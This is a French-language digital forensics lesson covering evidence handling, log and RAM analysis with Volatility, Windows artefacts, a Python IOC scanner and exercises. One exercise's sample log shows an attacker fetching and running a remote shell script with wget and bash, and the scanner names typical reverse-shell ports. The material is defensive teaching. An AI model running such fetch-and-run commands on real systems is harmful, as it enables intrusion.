@@ -1,0 +1,828 @@
+# 🔍 LEÇON 8 — Forensic Numérique
+### *Investigation · Analyse · Reconstruction · Preuve*
+
+---
+
+## POURQUOI LE FORENSIC EST DIFFÉRENT DU PENTEST
+
+```
+PENTEST          → Tu attaques pour trouver les failles
+FORENSIC         → Tu analyses pour comprendre ce qui s'est passé
+
+PENTEST          → Tu agis avant l'incident
+FORENSIC         → Tu interviens après l'incident
+
+PENTEST          → Tu cherches des vulnérabilités
+FORENSIC         → Tu cherches des preuves
+```
+
+Le forensic c'est la **médecine légale du numérique**. Comme un médecin légiste sur une scène de crime — tu ne touches rien sans protocole, tu documentes tout, et ton objectif c'est la vérité.
+
+---
+
+## PARTIE 1 — Les Principes Fondamentaux
+
+### Le Principe de Locard
+
+En criminalistique classique, Edmond Locard a établi :
+
+> *"Tout contact laisse une trace."*
+
+En forensic numérique c'est identique :
+
+```
+Un attaquant qui accède à un système laisse toujours des traces :
+→ Dans les logs
+→ Dans la mémoire RAM
+→ Dans les fichiers temporaires
+→ Dans le registre Windows
+→ Dans les métadonnées des fichiers
+→ Dans les connexions réseau
+```
+
+Même s'il efface ses traces — l'effacement lui-même laisse des traces.
+
+### La Règle d'Or — Ne pas modifier la preuve
+
+```
+SCÈNE DE CRIME PHYSIQUE     SCÈNE DE CRIME NUMÉRIQUE
+─────────────────────────   ────────────────────────
+Ne pas toucher les objets   Ne pas modifier les fichiers
+Porter des gants            Travailler sur une copie
+Photographier avant tout    Hasher avant tout
+Chaîne de custody           Chaîne de custody numérique
+```
+
+**La chaîne de custody (chaîne de garde) :**
+Chaque personne qui touche une preuve doit être documentée. Qui a pris la preuve, quand, comment, où elle a été stockée. Sans ça, la preuve est irrecevable en justice.
+
+### L'Ordre de Volatilité
+
+Les données numériques ont des durées de vie différentes. Tu collectes toujours **du plus volatil au moins volatil** :
+
+```
+ORDRE DE COLLECTE (du plus volatile au plus stable) :
+
+1. Registres CPU et cache        → Disparaît en millisecondes
+2. Mémoire RAM                   → Disparaît à l'extinction
+3. Connexions réseau actives     → Change constamment
+4. Processus en cours            → Change constamment
+5. Fichiers temporaires          → Effacés au reboot
+6. Disque dur                    → Persiste mais peut être effacé
+7. Logs distants                 → Relativement stables
+8. Sauvegardes et archives       → Très stables
+```
+
+Si tu éteins l'ordinateur avant de collecter la RAM — tu perds toute la mémoire volatile. C'est une erreur irréparable.
+
+---
+
+## PARTIE 2 — Forensic sur Linux
+
+### Premiers pas sur un système compromis
+
+```bash
+# ══ ÉTAPE 1 — Documenter l'état avant tout ══
+
+# Date et heure système — noter immédiatement
+date
+timedatectl
+
+# Uptime — depuis combien de temps le système tourne
+uptime
+
+# Qui est connecté maintenant
+w
+who
+last -n 30          # 30 dernières connexions
+
+# ══ ÉTAPE 2 — Processus suspects ══
+
+# Tous les processus avec arbre de parenté
+ps auxf
+
+# Processus triés par consommation CPU
+ps aux --sort=-%cpu | head -20
+
+# Processus avec connexions réseau ouvertes
+# Un malware communique souvent avec un C2
+ss -tulnp
+netstat -tulnp
+
+# Processus cachés — comparer /proc avec ps
+ls /proc | grep -E '^[0-9]+$' > /tmp/proc_pids.txt
+ps aux | awk '{print $2}' > /tmp/ps_pids.txt
+# Différence = processus cachés par rootkit
+
+# ══ ÉTAPE 3 — Connexions réseau suspectes ══
+
+# Connexions établies vers l'extérieur
+ss -tnp state established
+
+# Résoudre les IPs des connexions suspectes
+# Une connexion vers une IP inconnue = C2 possible
+ss -tnp | awk '{print $5}' | cut -d: -f1 | sort -u
+
+# ══ ÉTAPE 4 — Fichiers suspects ══
+
+# Fichiers modifiés dans les dernières 24h
+find / -mtime -1 -type f 2>/dev/null | grep -v proc
+
+# Fichiers créés récemment dans /tmp
+ls -lat /tmp/
+ls -lat /var/tmp/
+
+# Fichiers cachés (commençant par .)
+find / -name ".*" -type f 2>/dev/null | head -30
+
+# Fichiers SUID suspects
+find / -perm -4000 -type f 2>/dev/null
+
+# Scripts dans les crons
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# ══ ÉTAPE 5 — Comptes et authentification ══
+
+# Comptes avec UID 0 (root) non officiels
+awk -F: '$3==0 {print}' /etc/passwd
+
+# Connexions SSH récentes
+grep "Accepted" /var/log/auth.log | tail -20
+grep "Failed" /var/log/auth.log | tail -20
+
+# Clés SSH autorisées — backdoors possibles
+cat /root/.ssh/authorized_keys
+find /home -name "authorized_keys" 2>/dev/null
+```
+
+### Analyser les logs
+
+```bash
+# Logs Linux essentiels
+/var/log/auth.log      # Authentifications SSH, sudo
+/var/log/syslog        # Logs système généraux
+/var/log/kern.log      # Logs kernel
+/var/log/apache2/      # Logs serveur web Apache
+/var/log/nginx/        # Logs serveur web Nginx
+/var/log/mysql/        # Logs base de données
+
+# Recherches forensiques dans les logs
+# Connexions SSH réussies depuis des IPs inconnues
+grep "Accepted password" /var/log/auth.log
+grep "Accepted publickey" /var/log/auth.log
+
+# Tentatives de connexion échouées
+grep "Failed password" /var/log/auth.log | \
+    awk '{print $11}' | sort | uniq -c | sort -rn | head -10
+
+# Commandes sudo utilisées
+grep "sudo" /var/log/auth.log | grep "COMMAND"
+
+# Détection de scan de ports dans les logs web
+grep "404" /var/log/apache2/access.log | \
+    awk '{print $1}' | sort | uniq -c | sort -rn | head -10
+```
+
+### Parser les logs avec Python
+
+```python
+import re
+from collections import Counter
+from datetime import datetime
+
+def analyser_auth_log(chemin_log):
+    """
+    Analyse le fichier auth.log pour détecter
+    des comportements suspects
+    """
+    print(f"\n[*] Analyse de {chemin_log}")
+
+    # Patterns de recherche
+    pattern_succes = r"Accepted (?:password|publickey) for (\w+) from ([\d.]+)"
+    pattern_echec = r"Failed password for (?:invalid user )?(\w+) from ([\d.]+)"
+    pattern_sudo = r"sudo.+USER=(\w+).+COMMAND=(.+)"
+
+    connexions_reussies = []
+    connexions_echouees = []
+    commandes_sudo = []
+
+    try:
+        with open(chemin_log, "r", errors="ignore") as f:
+            for ligne in f:
+
+                # Connexions réussies
+                match = re.search(pattern_succes, ligne)
+                if match:
+                    connexions_reussies.append({
+                        "user": match.group(1),
+                        "ip": match.group(2),
+                        "ligne": ligne.strip()
+                    })
+
+                # Connexions échouées
+                match = re.search(pattern_echec, ligne)
+                if match:
+                    connexions_echouees.append({
+                        "user": match.group(1),
+                        "ip": match.group(2)
+                    })
+
+                # Commandes sudo
+                match = re.search(pattern_sudo, ligne)
+                if match:
+                    commandes_sudo.append({
+                        "user": match.group(1),
+                        "commande": match.group(2)
+                    })
+
+    except FileNotFoundError:
+        print(f"  Fichier non trouvé : {chemin_log}")
+        return
+
+    # Analyser les résultats
+    print(f"\n  Connexions réussies : {len(connexions_reussies)}")
+    for c in connexions_reussies[-5:]:
+        print(f"  → {c['user']} depuis {c['ip']}")
+
+    print(f"\n  Tentatives échouées : {len(connexions_echouees)}")
+    # Top IPs qui tentent des connexions
+    ips_echec = Counter(c["ip"] for c in connexions_echouees)
+    print("  Top IPs suspectes :")
+    for ip, count in ips_echec.most_common(5):
+        print(f"  → {ip} : {count} tentatives")
+
+    print(f"\n  Commandes sudo : {len(commandes_sudo)}")
+    for cmd in commandes_sudo[-5:]:
+        print(f"  → {cmd['user']} : {cmd['commande'][:60]}")
+
+    return {
+        "reussies": connexions_reussies,
+        "echouees": connexions_echouees,
+        "sudo": commandes_sudo
+    }
+```
+
+---
+
+## PARTIE 3 — Analyse de Mémoire RAM
+
+### Pourquoi la RAM est cruciale
+
+```
+Ce qu'on trouve en RAM que le disque ne contient pas :
+
+→ Mots de passe en clair (avant chiffrement)
+→ Clés de chiffrement actives
+→ Processus malveillants en cours
+→ Connexions réseau actives
+→ Code injecté dans des processus légitimes
+→ Historique des commandes non sauvegardé
+→ Fichiers ouverts mais pas sauvegardés
+```
+
+### Capturer la RAM
+
+```bash
+# Linux — avec LiME (Linux Memory Extractor)
+# LiME est un module kernel qui dump la RAM
+# insmod lime.ko "path=/media/usb/ram.lime format=lime"
+
+# Alternative avec /proc/kcore (si accessible)
+dd if=/proc/kcore of=/media/usb/ram.dump
+
+# Vérifier l'intégrité de la capture
+sha256sum /media/usb/ram.lime > /media/usb/ram.lime.sha256
+```
+
+### Analyser avec Volatility
+
+Volatility est l'outil standard pour l'analyse de mémoire. Il permet d'extraire des informations d'un dump RAM sans démarrer le système.
+
+```bash
+# Volatility 3 — commandes principales
+# pip install volatility3
+
+# Identifier le profil (version OS)
+vol -f ram.lime windows.info
+vol -f ram.lime linux.info
+
+# Liste des processus au moment du dump
+vol -f ram.lime windows.pslist
+vol -f ram.lime linux.pslist
+
+# Processus cachés (rootkits)
+vol -f ram.lime windows.psscan
+# psscan scanne la mémoire brute
+# pslist utilise les structures OS
+# Différence entre les deux = processus cachés
+
+# Connexions réseau actives
+vol -f ram.lime windows.netstat
+vol -f ram.lime linux.netstat
+
+# DLLs/modules chargés par un processus
+vol -f ram.lime windows.dlllist --pid 1234
+
+# Extraire les mots de passe Windows (hashes NTLM)
+vol -f ram.lime windows.hashdump
+
+# Chercher des strings dans la RAM
+vol -f ram.lime windows.strings --pid 1234 | grep -i "password"
+
+# Extraire un fichier depuis la RAM
+vol -f ram.lime windows.dumpfiles --pid 1234
+```
+
+---
+
+## PARTIE 4 — Forensic Windows
+
+### Artefacts Windows essentiels
+
+```
+REGISTRE WINDOWS — Base de données de configuration
+Clés forensiquement importantes :
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+→ Programmes qui démarrent avec Windows
+→ Malwares s'y installent souvent pour la persistance
+
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+→ Même chose pour l'utilisateur courant
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+→ Services installés — backdoors se font passer pour des services
+
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+→ Fichiers récemment ouverts
+
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+→ Peut contenir des credentials
+```
+
+### Fichiers d'artefacts Windows
+
+```
+C:\Windows\System32\winevt\Logs\
+→ Logs d'événements Windows
+→ Security.evtx = connexions, créations de comptes
+→ System.evtx = services, drivers
+→ Application.evtx = logs applicatifs
+
+C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Recent\
+→ Fichiers récemment ouverts (LNK files)
+
+C:\Users\[user]\NTUSER.DAT
+→ Registre de l'utilisateur
+
+C:\Windows\Prefetch\
+→ Historique des programmes exécutés
+→ Même supprimés, les traces restent
+
+C:\$MFT (Master File Table)
+→ Index de tous les fichiers NTFS
+→ Fichiers supprimés restent dans la MFT un certain temps
+
+C:\Windows\System32\config\SAM
+→ Base de données des comptes locaux
+→ Mots de passe hashés NTLM
+```
+
+### Analyser les Event Logs Windows
+
+```python
+import re
+from datetime import datetime
+
+def analyser_event_log_simple(contenu_log):
+    """
+    Analyse basique des Event IDs Windows importants
+    En forensic, les Event IDs sont le langage des logs Windows
+    """
+
+    # Event IDs critiques en sécurité
+    event_ids = {
+        "4624": "Connexion réussie",
+        "4625": "Échec de connexion",
+        "4634": "Déconnexion",
+        "4648": "Connexion avec credentials explicites",
+        "4672": "Privileges spéciaux assignés",
+        "4688": "Nouveau processus créé",
+        "4698": "Tâche planifiée créée",
+        "4720": "Compte utilisateur créé",
+        "4732": "Utilisateur ajouté au groupe Administrateurs",
+        "7045": "Nouveau service installé",
+        "1102": "Log d'audit effacé — SUSPECT"
+    }
+
+    print("\n=== ANALYSE EVENT IDS WINDOWS ===\n")
+
+    for event_id, description in event_ids.items():
+        # Chercher l'Event ID dans le contenu
+        occurrences = contenu_log.count(f"EventID={event_id}")
+        if occurrences > 0:
+            niveau = "🚨" if event_id in ["1102", "4720", "4732", "7045"] else "⚠️"
+            print(f"{niveau} Event {event_id} ({description})")
+            print(f"   Occurrences : {occurrences}")
+
+    return event_ids
+```
+
+---
+
+## PARTIE 5 — Reconstruction de la Timeline
+
+C'est l'objectif final du forensic — comprendre **exactement** ce qui s'est passé, dans quel ordre, à quelle heure.
+
+### Construire une timeline forensique
+
+```python
+import os
+import datetime
+import hashlib
+import json
+
+def collecter_metadonnees_fichier(chemin):
+    """
+    Collecte les métadonnées temporelles d'un fichier
+    Cruciales pour reconstruire une timeline d'attaque
+    """
+    try:
+        stat = os.stat(chemin)
+
+        return {
+            "chemin": chemin,
+            "taille": stat.st_size,
+            # atime = dernier accès (lecture)
+            "acces": datetime.datetime.fromtimestamp(
+                stat.st_atime
+            ).isoformat(),
+            # mtime = dernière modification du contenu
+            "modification": datetime.datetime.fromtimestamp(
+                stat.st_mtime
+            ).isoformat(),
+            # ctime = changement de métadonnées (permissions, propriétaire)
+            "changement": datetime.datetime.fromtimestamp(
+                stat.st_ctime
+            ).isoformat(),
+            # Hash pour vérifier l'intégrité
+            "sha256": hasher_fichier(chemin)
+        }
+    except (PermissionError, FileNotFoundError):
+        return None
+
+def hasher_fichier(chemin):
+    """Hash SHA256 d'un fichier pour l'intégrité forensique"""
+    try:
+        h = hashlib.sha256()
+        with open(chemin, "rb") as f:
+            for chunk in iter(lambda: f.read(4096), b""):
+                h.update(chunk)
+        return h.hexdigest()
+    except:
+        return "inaccessible"
+
+def construire_timeline(dossier, heures_passees=24):
+    """
+    Construit une timeline des fichiers modifiés
+    dans les dernières N heures
+    Utile pour voir ce qu'un attaquant a touché
+    """
+    print(f"\n[*] Construction timeline : {dossier}")
+    print(f"[*] Fenêtre : {heures_passees} dernières heures")
+
+    maintenant = datetime.datetime.now()
+    limite = maintenant - datetime.timedelta(hours=heures_passees)
+
+    evenements = []
+
+    for racine, dossiers, fichiers in os.walk(dossier):
+        for fichier in fichiers:
+            chemin = os.path.join(racine, fichier)
+            meta = collecter_metadonnees_fichier(chemin)
+
+            if meta:
+                # Vérifier si modifié dans la fenêtre temporelle
+                date_modif = datetime.datetime.fromisoformat(
+                    meta["modification"]
+                )
+
+                if date_modif > limite:
+                    evenements.append(meta)
+
+    # Trier par date de modification
+    evenements.sort(key=lambda x: x["modification"])
+
+    print(f"\n[+] {len(evenements)} fichiers modifiés trouvés")
+    for ev in evenements:
+        print(f"\n  {ev['modification']}")
+        print(f"  Fichier : {ev['chemin']}")
+        print(f"  Taille  : {ev['taille']} bytes")
+        print(f"  SHA256  : {ev['sha256'][:16]}...")
+
+    return evenements
+```
+
+---
+
+## PARTIE 6 — Détecter un Malware
+
+### Indicateurs de compromission (IOC) sur un système
+
+```python
+import os
+import hashlib
+import subprocess
+
+def detecter_ioc_systeme():
+    """
+    Recherche d'indicateurs de compromission
+    sur un système Linux
+    """
+    print("\n=== SCAN IOC SYSTÈME ===\n")
+    alertes = []
+
+    # 1. Vérifier les connexions sortantes suspectes
+    print("[*] Vérification connexions réseau...")
+    try:
+        result = subprocess.run(
+            ["ss", "-tnp", "state", "established"],
+            capture_output=True, text=True
+        )
+        # Ports suspects pour connexions sortantes
+        ports_suspects = ["4444", "1337", "31337", "8888", "9999"]
+        for port in ports_suspects:
+            if port in result.stdout:
+                alertes.append(f"ALERTE : Connexion sur port suspect {port}")
+                print(f"  🚨 Port suspect détecté : {port}")
+    except:
+        pass
+
+    # 2. Fichiers suspects dans /tmp
+    print("\n[*] Vérification /tmp...")
+    tmp_suspects = []
+    try:
+        for fichier in os.listdir("/tmp"):
+            chemin = os.path.join("/tmp", fichier)
+            if os.path.isfile(chemin):
+                # Fichiers exécutables dans /tmp = très suspect
+                if os.access(chemin, os.X_OK):
+                    alertes.append(f"ALERTE : Exécutable dans /tmp : {fichier}")
+                    print(f"  🚨 Exécutable suspect : /tmp/{fichier}")
+                    tmp_suspects.append(chemin)
+    except:
+        pass
+
+    # 3. Comptes avec UID 0 non autorisés
+    print("\n[*] Vérification comptes root...")
+    try:
+        with open("/etc/passwd") as f:
+            for ligne in f:
+                parts = ligne.strip().split(":")
+                if len(parts) >= 3 and parts[2] == "0":
+                    if parts[0] != "root":
+                        alertes.append(
+                            f"ALERTE : Compte UID 0 non autorisé : {parts[0]}"
+                        )
+                        print(f"  🚨 Compte root suspect : {parts[0]}")
+    except:
+        pass
+
+    # 4. Clés SSH non autorisées
+    print("\n[*] Vérification clés SSH...")
+    chemins_ssh = [
+        "/root/.ssh/authorized_keys",
+        "/home/*/.ssh/authorized_keys"
+    ]
+    try:
+        result = subprocess.run(
+            ["find", "/", "-name", "authorized_keys", "-type", "f"],
+            capture_output=True, text=True, timeout=10
+        )
+        for fichier in result.stdout.strip().split("\n"):
+            if fichier:
+                try:
+                    with open(fichier) as f:
+                        nb_cles = len(
+                            [l for l in f.readlines() if l.strip()]
+                        )
+                        print(f"  {fichier} : {nb_cles} clé(s)")
+                        if nb_cles > 0:
+                            alertes.append(
+                                f"INFO : {nb_cles} clé(s) SSH dans {fichier}"
+                            )
+                except:
+                    pass
+    except:
+        pass
+
+    # Résumé
+    print(f"\n{'='*40}")
+    print(f"RÉSUMÉ : {len(alertes)} alerte(s) détectée(s)")
+    for alerte in alertes:
+        print(f"  → {alerte}")
+
+    return alertes
+```
+
+---
+
+## PARTIE 7 — Cas Pratique : Reconstituer l'Attaque DGRH
+
+Appliquons la méthodologie forensique à ton expérience réelle.
+
+### Reconstitution hypothétique basée sur les éléments connus
+
+```
+CE QUE TU SAVAIS :
+→ Un numéro virtuel a été utilisé
+→ Le numéro était associé à un vrai email
+→ Les attaquants avaient accès au système
+
+CE QU'UN FORENSIC AURAIT RÉVÉLÉ :
+
+ÉTAPE 1 — Vecteur d'entrée probable
+→ Analyser /var/log/auth.log ou les logs IIS/Apache
+→ Chercher la première connexion anormale
+→ IP source → géolocaliser → VPN ou pas ?
+
+ÉTAPE 2 — Établissement de la persistance
+→ Vérifier /etc/crontab → backdoor planifiée ?
+→ Vérifier les services → nouveau service installé ?
+→ Vérifier les comptes → UID 0 ajouté ?
+
+ÉTAPE 3 — Actions post-compromission
+→ Fichiers accédés ou exfiltrés ?
+→ find / -atime -7 (accédés dans la semaine)
+→ Logs réseau → transferts de données anormaux ?
+
+ÉTAPE 4 — Pivot réseau
+→ Depuis quel système l'attaque a commencé ?
+→ Vers quels autres systèmes l'attaquant est allé ?
+→ Analyse ARP + connexions réseau établies
+
+TIMELINE PROBABLE :
+J-X   → Reconnaissance du portail DGRH
+J-X+1 → Exploitation d'une vulnérabilité web ou phishing
+J-X+2 → Établissement persistance avec numéro virtuel
+J     → Découverte par la DGRH
+J+1   → Appel à ECHATS pour investigation
+```
+
+---
+
+## PARTIE 8 — Produire un Rapport Forensique
+
+```python
+import json
+import datetime
+import hashlib
+
+def generer_rapport_forensique(infos_incident, preuves, timeline):
+    """
+    Structure standard d'un rapport forensique
+    Utilisable en contexte légal
+    """
+
+    rapport = {
+        "rapport_forensique": {
+
+            "entete": {
+                "titre": f"Rapport d'Investigation Forensique",
+                "reference": f"FOR-{datetime.datetime.now().strftime('%Y%m%d-%H%M')}",
+                "date_incident": infos_incident.get("date_incident"),
+                "date_investigation": datetime.datetime.now().isoformat(),
+                "investigateur": infos_incident.get("investigateur"),
+                "classification": "CONFIDENTIEL",
+                "mandat": infos_incident.get("numero_mandat")
+            },
+
+            "resume_executif": {
+                "nature_incident": infos_incident.get("nature"),
+                "systemes_affectes": infos_incident.get("systemes"),
+                "impact_estime": infos_incident.get("impact"),
+                "conclusion": infos_incident.get("conclusion")
+            },
+
+            "methodologie": {
+                "ordre_collecte": [
+                    "Processus et connexions actives",
+                    "Mémoire volatile (RAM)",
+                    "Logs système",
+                    "Système de fichiers",
+                    "Sauvegardes"
+                ],
+                "outils_utilises": infos_incident.get("outils", []),
+                "limitations": infos_incident.get("limitations", [])
+            },
+
+            "preuves": [
+                {
+                    "id": f"P{str(i+1).zfill(3)}",
+                    "description": p.get("description"),
+                    "type": p.get("type"),
+                    "hash_sha256": p.get("hash"),
+                    "date_collecte": p.get("date"),
+                    "localisation": p.get("source")
+                }
+                for i, p in enumerate(preuves)
+            ],
+
+            "timeline": sorted(
+                timeline,
+                key=lambda x: x.get("timestamp", "")
+            ),
+
+            "conclusions": {
+                "vecteur_initial": infos_incident.get("vecteur"),
+                "techniques_attaquant": infos_incident.get("techniques", []),
+                "donnees_compromises": infos_incident.get("donnees"),
+                "recommandations": infos_incident.get("recommandations", [])
+            }
+        }
+    }
+
+    # Sauvegarder
+    nom = f"rapport_forensique_{rapport['rapport_forensique']['entete']['reference']}.json"
+    with open(nom, "w", encoding="utf-8") as f:
+        json.dump(rapport, f, indent=4, ensure_ascii=False)
+
+    print(f"[+] Rapport forensique généré : {nom}")
+    return rapport
+```
+
+---
+
+## ✅ EXERCICES — Leçon 8
+
+---
+
+**Exercice 1 — Ordre de volatilité**
+
+Un système Linux en production vient d'être compromis. Tu arrives sur place. Le système est toujours en marche.
+
+Dans quel ordre exact collectes-tu les preuves et pourquoi ? Liste 7 étapes.
+
+---
+
+**Exercice 2 — Analyser ce log**
+
+```
+May 28 03:47:22 srv sshd: Failed password for root from 185.220.101.42 port 52341
+May 28 03:47:24 srv sshd: Failed password for root from 185.220.101.42 port 52342
+May 28 03:47:26 srv sshd: Failed password for root from 185.220.101.42 port 52343
+May 28 03:47:31 srv sshd: Accepted password for root from 185.220.101.42 port 52344
+May 28 03:47:35 srv sshd: Accepted password for deploy from 192.168.1.10 port 22
+May 28 03:49:12 srv sudo: root : COMMAND=/usr/bin/wget http://185.220.101.42/shell.sh
+May 28 03:49:15 srv sudo: root : COMMAND=/bin/bash shell.sh
+May 28 03:51:03 srv cron: root edited crontab
+```
+
+Reconstitue la timeline de l'attaque. Que s'est-il passé exactement ?
+
+---
+
+**Exercice 3 — Identifier les artefacts**
+
+Pour chaque question, dis où tu cherches la réponse sur un système Linux compromis :
+
+1. Quand l'attaquant s'est-il connecté pour la première fois ?
+2. Quels fichiers a-t-il ouverts ou modifiés ?
+3. A-t-il créé un nouveau compte utilisateur ?
+4. A-t-il établi une persistance ?
+5. Vers quelles IPs externes a-t-il communiqué ?
+
+---
+
+**Exercice 4 — Cas réel**
+
+Reprends l'affaire DGRH. Maintenant que tu as la méthodologie forensique complète — si tu avais eu accès aux systèmes avec un mandat, décris les 5 premières actions forensiques que tu aurais faites. Qu'aurais-tu cherché en priorité ?
+
+---
+
+**Exercice 5 — Chaîne de custody**
+
+Tu collectes un disque dur comme preuve. Décris la procédure complète de chaîne de custody depuis le moment où tu touches le disque jusqu'au moment où tu le remets au client ou aux autorités.
+
+---
+
+## 📌 À retenir absolument
+
+```
+Locard          → Tout contact laisse une trace
+Volatilité      → RAM avant disque — toujours
+Chaîne custody  → Documenter chaque contact avec la preuve
+atime/mtime/ctime → 3 timestamps différents sur chaque fichier
+Event IDs       → 4624=login, 4625=échec, 4688=processus, 1102=log effacé
+Volatility      → Outil standard analyse RAM
+Timeline        → Reconstituer dans l'ordre chronologique
+Hash avant tout → SHA256 avant de toucher quoi que ce soit
+```
+
+---
+
+**Leçon 9 dans 2 jours : Malware Analysis.**
+
+Tu vas apprendre à disséquer un programme malveillant. Analyse statique, analyse dynamique, reverse engineering basique, identifier les indicateurs de compromission. 🔒
